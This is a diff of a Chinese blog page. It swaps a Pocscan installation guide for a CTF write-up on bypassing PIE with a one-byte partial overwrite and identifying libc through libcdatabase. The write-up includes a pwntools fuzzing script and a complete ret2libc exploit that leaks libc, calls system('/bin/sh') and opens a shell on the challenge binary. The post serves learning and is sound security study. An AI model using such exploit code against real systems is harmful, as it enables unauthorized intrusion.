@@ -2,23 +2,30 @@
 <html  lang="zh">
 <head>
     <meta charset="utf-8">
-<title>Kali安装pocscan - Junay的博客</title>
+<title>bypass pie use partial overwrite2 and libcdatabase - Junay的博客</title>
 <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
 
 
 
-    <meta name="description" content="介绍&amp;emsp;简单记录在Kali下安装Pocscan，Pocscan是一款开源 Poc 调用框架,可轻松调用Pocsuite,Tangscan,Beebeeto,Knowsec老版本POC 按照官方规范编写的 Poc对目标域名进行扫描，并可以通过 Docker 一键部署。  Step 1：apt-get install docker  Step 2: 更改更新源列表（/etc/apt/sourc">
-<meta name="keywords" content="hexo,javascript">
+    <meta name="description" content="前言&amp;emsp;&amp;emsp;这篇继续学习PIE bypass和通过libcdatabase查找libc库。">
+<meta name="keywords" content="ctf,pie,libcdatabase">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Kali安装pocscan">
-<meta property="og:url" content="http://yoursite.com/2017/11/kali-install-pocscan/index.html">
+<meta property="og:title" content="bypass pie use partial overwrite2 and libcdatabase">
+<meta property="og:url" content="http://yoursite.com/2018/11/bypass-pie-and-libcdatabase/index.html">
 <meta property="og:site_name" content="Junay的博客">
-<meta property="og:description" content="介绍&amp;emsp;简单记录在Kali下安装Pocscan，Pocscan是一款开源 Poc 调用框架,可轻松调用Pocsuite,Tangscan,Beebeeto,Knowsec老版本POC 按照官方规范编写的 Poc对目标域名进行扫描，并可以通过 Docker 一键部署。  Step 1：apt-get install docker  Step 2: 更改更新源列表（/etc/apt/sourc">
+<meta property="og:description" content="前言&amp;emsp;&amp;emsp;这篇继续学习PIE bypass和通过libcdatabase查找libc库。">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2018-11-23T12:44:51.380Z">
+<meta property="og:image" content="http://yoursite.com/images/posts/pwn/20.png">
+<meta property="og:image" content="http://yoursite.com/images/posts/pwn/21.png">
+<meta property="og:image" content="http://yoursite.com/images/posts/pwn/22.png">
+<meta property="og:image" content="http://yoursite.com/images/posts/pwn/23.png">
+<meta property="og:image" content="http://yoursite.com/images/posts/pwn/24.png">
+<meta property="og:image" content="http://yoursite.com/images/posts/pwn/25.png">
+<meta property="og:updated_time" content="2018-11-27T13:10:24.632Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Kali安装pocscan">
-<meta name="twitter:description" content="介绍&amp;emsp;简单记录在Kali下安装Pocscan，Pocscan是一款开源 Poc 调用框架,可轻松调用Pocsuite,Tangscan,Beebeeto,Knowsec老版本POC 按照官方规范编写的 Poc对目标域名进行扫描，并可以通过 Docker 一键部署。  Step 1：apt-get install docker  Step 2: 更改更新源列表（/etc/apt/sourc">
+<meta name="twitter:title" content="bypass pie use partial overwrite2 and libcdatabase">
+<meta name="twitter:description" content="前言&amp;emsp;&amp;emsp;这篇继续学习PIE bypass和通过libcdatabase查找libc库。">
+<meta name="twitter:image" content="http://yoursite.com/images/posts/pwn/20.png">
 
 
 
@@ -84,7 +91,7 @@
         <div class="navbar-brand is-flex-center">
             <a class="navbar-item navbar-logo" href="/">
             
-                <img src="/images/logo.svg" alt="Kali安装pocscan" height="28">
+                <img src="/images/logo.svg" alt="bypass pie use partial overwrite2 and libcdatabase" height="28">
             
             </a>
         </div>
@@ -140,17 +147,13 @@
         
         <div class="level article-meta is-size-7 is-uppercase is-mobile is-overflow-x-auto">
             <div class="level-left">
-                <time class="level-item has-text-grey" datetime="2017-11-24T01:26:00.000Z">2017-11-24</time>
-                
-                <div class="level-item">
-                <a class="has-link-grey -link" href="/categories/jekyll-update/">jekyll update</a>
-                </div>
+                <time class="level-item has-text-grey" datetime="2018-11-23T08:47:56.000Z">2018-11-23</time>
                 
                 
                 <span class="level-item has-text-grey">
                     
                     
-                    2 分钟 读完 (大约 245 个字)
+                    5 分钟 读完 (大约 718 个字)
                 </span>
                 
             </div>
@@ -158,37 +161,38 @@
         
         <h1 class="title is-size-3 is-size-4-mobile has-text-weight-normal">
             
-                Kali安装pocscan
+                bypass pie use partial overwrite2 and libcdatabase
             
         </h1>
         <div class="content">
-            <h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>&emsp;简单记录在<code>Kali下安装Pocscan</code>，Pocscan是一款开源 Poc 调用框架,可轻松调用Pocsuite,Tangscan,Beebeeto,Knowsec老版本POC 按照官方规范编写的 Poc对目标域名进行扫描，并可以通过 Docker 一键部署。</p>
-<ul>
-<li><p>Step 1：apt-get install docker</p>
-</li>
-<li><p>Step 2: 更改更新源列表（/etc/apt/source.list），往里面增加docker更新源。解决：<br>没有可用的软件包 docker.io，但是它被其它的软件包引用了。<br>E: 软件包 docker.io 没有可安装候选</p>
-<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">deb http://http.debian.net/debian jessie-backports main</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>step 3：apt-get install docker.io</p>
-</li>
-<li><p>step 4：service docker start</p>
-</li>
-<li><p>step 5: docker pull daocloud.io/aber/pocscan:latest</p>
-</li>
-<li><p>step 6: cd /</p>
-</li>
-<li><p>step 7: git clone <a href="https://github.com/erevus-cn/pocscan.git" target="_blank" rel="noopener">https://github.com/erevus-cn/pocscan.git</a></p>
-</li>
-<li><p>step 8: chmod -R 0777 pocscan</p>
-</li>
-<li><p>step 9: docker run -d -v /pocscan:/www -p 8090:8000 -p 8088:8088 daocloud.io/aber/pocscan:latest</p>
-</li>
-<li><p>step 10: 访问本地8090端口，后台和终端的帐号是root,密码是password.</p>
-</li>
-<li><p>Step 11：安装google chrome，并把主目录下pocsuite中的pocscan.crx安装到chrome。</p>
-</li>
-</ul>
+            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>&emsp;&emsp;这篇继续学习<code>PIE bypass</code>和通过<code>libcdatabase</code>查找libc库。<br><a id="more"></a></p>
+<h3 id="DEMO1"><a href="#DEMO1" class="headerlink" title="DEMO1"></a>DEMO1</h3><p>&emsp;&emsp;在上一篇文章中采用了爆破程序中的某个函数(如send)的地址，通过判断是否有信息返回作为判断依据，但这个前提是使用了<code>fork</code>进程，因为这样每次的地址才不会变。</p>
+<p>&emsp;&emsp;而在这个例子中，服务端并没有采用<code>fork</code>，我们每次请求的地址都不一样，所以就不能像上一道题的爆破做法。先看看程序代码：</p>
+<div align="center"><br>    <img src="/images/posts/pwn/20.png"><br></div><br>&emsp;&emsp;漏洞产生在<code>read_msg(0, &amp;s, 128, 10)</code>，前面的<code>read_msg</code>并不会溢出。<br><br>&emsp;&emsp;<code>checksec</code>如下：<br><div align="center"><br>    <img src="/images/posts/pwn/21.png"><br></div>
 
+<p>&emsp;&emsp;<code>canary</code>是没开的。这里采用的手法也跟前面相似，还是要利用<code>partial overwrite</code>，是程序产生<code>crash</code>，然后我们从输出的数据中发现有价值的信息。一样的因为<code>pie</code>的原因，我们只能操作最低一个字节，可以先写个程序爆破一波，并观察<code>crash</code>。脚本：</p>
+<figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fuzz</span><span class="hljs-params">()</span>:</span></span><br><span class="line">    <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>,<span class="hljs-number">256</span>):</span><br><span class="line">        p = process(<span class="hljs-string">'./pieagain'</span>)</span><br><span class="line">        <span class="hljs-comment"># p = remote(ip, 10008)</span></span><br><span class="line">        p.recvline()</span><br><span class="line">        payload = <span class="hljs-string">'A'</span> * <span class="hljs-number">4</span></span><br><span class="line">        p.sendline(payload)</span><br><span class="line">        </span><br><span class="line">        p.recvline()</span><br><span class="line">        p.recvline()</span><br><span class="line">        <span class="hljs-comment"># pause()</span></span><br><span class="line">        payload = <span class="hljs-string">'A'</span> * <span class="hljs-number">4</span> * <span class="hljs-number">11</span> + chr(a)</span><br><span class="line">        p.sendline(payload)</span><br><span class="line">        <span class="hljs-keyword">try</span>:</span><br><span class="line">            p.recvline()</span><br><span class="line">            <span class="hljs-keyword">print</span> <span class="hljs-string">"======================ok------------"</span> + hex(a)</span><br><span class="line">        <span class="hljs-keyword">except</span>:</span><br><span class="line">            <span class="hljs-keyword">pass</span></span><br><span class="line">        p.close()</span><br></pre></td></tr></table></figure>
+<p>&emsp;&emsp;然后可能在几个地方得到<code>crash</code>，然后对这些产生地方的地址进行筛选，挑选合适的点。这里我得到了<code>\x83</code>、<code>\xde</code>等等。。。</p>
+<p>&emsp;&emsp;接着对<code>crash</code>出来的数据进行分析：</p>
+<div align="center"><br>    <img src="/images/posts/pwn/22.png"><br></div><br><div align="center"><br>    <img src="/images/posts/pwn/23.png"><br></div><br>&emsp;&emsp;可以看到这里泄露了<code>libc</code>的地址，但不是基地址，离基地址有这<code>0xf76f3000 - 0xf7541000 = 0x1b2000</code>，而这个差距每次都是固定的，通过<code>readelf -S</code>可以看到这是<code>.got.plt</code>偏移地址。<br><div align="center"><br>    <img src="/images/posts/pwn/24.png"><br></div>
+
+<blockquote>
+<p>这里是我本地的偏移地址，我们再打远程时<code>一定</code>要换成远程libc的偏移地址。</p>
+</blockquote>
+<p>&emsp;&emsp;有了libc基地址后就可以写exp了：</p>
+<figure class="highlight python hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *</span><br><span class="line">context(log_level = <span class="hljs-string">'debug'</span>, arch = <span class="hljs-string">'i386'</span>, os = <span class="hljs-string">'linux'</span>)</span><br><span class="line"></span><br><span class="line">ip = <span class="hljs-string">'192.168.10.11'</span></span><br><span class="line"><span class="hljs-comment"># p = remote(ip, 10008)</span></span><br><span class="line">p = process(<span class="hljs-string">'./pieagain'</span>)</span><br><span class="line">pelf = ELF(<span class="hljs-string">'./pieagain'</span>)</span><br><span class="line">libc = ELF(<span class="hljs-string">'./libc.so.local'</span>)</span><br><span class="line"></span><br><span class="line">p.recvline()</span><br><span class="line">payload = <span class="hljs-string">'A'</span> * <span class="hljs-number">4</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.recvline()</span><br><span class="line">p.recvline()</span><br><span class="line">pause()</span><br><span class="line">payload = <span class="hljs-string">'A'</span> * <span class="hljs-number">4</span> * <span class="hljs-number">11</span> + <span class="hljs-string">'\xde'</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">data = p.recv()</span><br><span class="line">libc_base_addr = u32(<span class="hljs-string">'\x00'</span>+data[<span class="hljs-number">9</span>:<span class="hljs-number">12</span>]) - <span class="hljs-number">0x1b2000</span></span><br><span class="line">log.debug(<span class="hljs-string">"libc_base_addr =======&gt; "</span> + hex(libc_base_addr))</span><br><span class="line"><span class="hljs-comment"># 细心的大佬发现这里是code base...</span></span><br><span class="line"><span class="hljs-comment"># program_start = u32(data[100:100+4]) &amp; 0xfffff000</span></span><br><span class="line"><span class="hljs-comment"># log.info("program start addr: " + hex(program_start))</span></span><br><span class="line"></span><br><span class="line">libc.address = libc_base_addr</span><br><span class="line">system_addr = libc.symbols[<span class="hljs-string">'system'</span>]</span><br><span class="line">log.debug(<span class="hljs-string">"system_addr: "</span> + hex(system_addr))</span><br><span class="line">binsh = next(libc.search(<span class="hljs-string">'/bin/sh'</span>))</span><br><span class="line">log.debug(<span class="hljs-string">"binsh_addr: "</span> + hex(binsh))</span><br><span class="line"></span><br><span class="line">payload = <span class="hljs-string">'B'</span> * <span class="hljs-number">4</span> * <span class="hljs-number">11</span> + p32(system_addr) + p32(system_addr) + p32(binsh)</span><br><span class="line">pause()</span><br><span class="line">log.debug(<span class="hljs-string">"ready to call system..."</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fuzz</span><span class="hljs-params">()</span>:</span></span><br><span class="line">    <span class="hljs-comment"># 看上面的</span></span><br><span class="line">    <span class="hljs-keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="hljs-comment"># fuzz()</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<h3 id="DEMO2"><a href="#DEMO2" class="headerlink" title="DEMO2"></a>DEMO2</h3><p>&emsp;&emsp;但我们没有libc时我们可以通过泄露两个<code>libc</code>函数的地址，然后取最后三位，因为基址的后三位为0，然后取<code>libcdatabase</code>查询，<a href="https://libc.blukat.me" target="_blank">可以点击这里</a>。</p>
+<div align="center"><br>    <img src="/images/posts/pwn/25.png"><br></div>
+
+        </div>
+        
+        <div class="level is-size-7 is-uppercase">
+            <div class="level-start">
+                <div class="level-item">
+                    <span class="is-size-6 has-text-grey has-mr-7">#</span>
+                    <a class="has-link-grey -link" href="/tags/CTF/">CTF</a>, <a class="has-link-grey -link" href="/tags/bypass-pie/">bypass pie</a>
+                </div>
+            </div>
         </div>
         
         
@@ -200,17 +204,10 @@
 <div class="card card-transparent">
     <div class="level post-navigation is-flex-wrap is-mobile">
         
-        <div class="level-start">
-            <a class="level level-item has-link-grey  article-nav-prev" href="/2017/11/linux-install-xdebug/">
-                <i class="level-item fas fa-chevron-left"></i>
-                <span class="level-item">Linux Xampp安装配置Xdebug</span>
-            </a>
-        </div>
-        
         
         <div class="level-end">
-            <a class="level level-item has-link-grey  article-nav-next" href="/2017/11/fckeditor-upload/">
-                <span class="level-item">FCKeditor 上传漏洞-截断上传</span>
+            <a class="level level-item has-link-grey  article-nav-next" href="/2018/11/pie-bypass-overwrite-dup2/">
+                <span class="level-item">bypass pie use partial overwrite and dup2</span>
                 <i class="level-item fas fa-chevron-right"></i>
             </a>
         </div>
@@ -226,8 +223,8 @@
         
 <script>
     var disqus_config = function () {
-        this.page.url = 'http://yoursite.com/2017/11/kali-install-pocscan/';
-        this.page.identifier = '2017/11/kali-install-pocscan/';
+        this.page.url = 'http://yoursite.com/2018/11/bypass-pie-and-libcdatabase/';
+        this.page.identifier = '2018/11/bypass-pie-and-libcdatabase/';
     };
     (function() {
         var d = document, s = d.createElement('script');  
@@ -1330,7 +1327,7 @@
             <div class="level-start has-text-centered-mobile">
                 <a class="footer-logo is-block has-mb-6" href="/">
                 
-                    <img src="/images/logo.svg" alt="Kali安装pocscan" height="28">
+                    <img src="/images/logo.svg" alt="bypass pie use partial overwrite2 and libcdatabase" height="28">
                 
                 </a>
                 <p class="is-size-7">
